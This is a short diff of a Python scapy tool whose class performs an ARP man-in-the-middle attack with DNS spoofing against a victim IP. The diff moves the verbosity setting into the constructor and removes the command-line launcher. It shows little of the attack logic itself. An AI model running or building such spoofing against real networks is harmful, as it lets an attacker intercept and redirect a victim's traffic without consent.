@@ -21,6 +21,9 @@ dns_hosts = {
 class ARPMITMDNSSpoofing():
     # Constructs the ARP Man in the Middle DNS Spoofing Attack
     def __init__(self, victimIP, interface):
+        # Disables verbosity (command line) mode
+        scapy.conf.verb = 0
+        
         # Assign default scapy interface
         scapy.conf.iface = interface
 
@@ -154,19 +157,3 @@ class ARPMITMDNSSpoofing():
         else:
             # We didn't receive a reply, or the reply wasn't what we expected
             print("ARP poisoning may not have been successful")
-
-
-# Starts the program
-if __name__ == '__main__':
-    # Disables verbosity (command line) mode
-    scapy.conf.verb = 0
-
-    # Assign parameters to variables
-    victimIP = sys.argv[1]
-    interface = sys.argv[2]
-
-    # Initialize Attack
-    attack = ARPMITMDNSSpoofing(victimIP, interface)
-
-    # Execute attack
-    attack.execute()
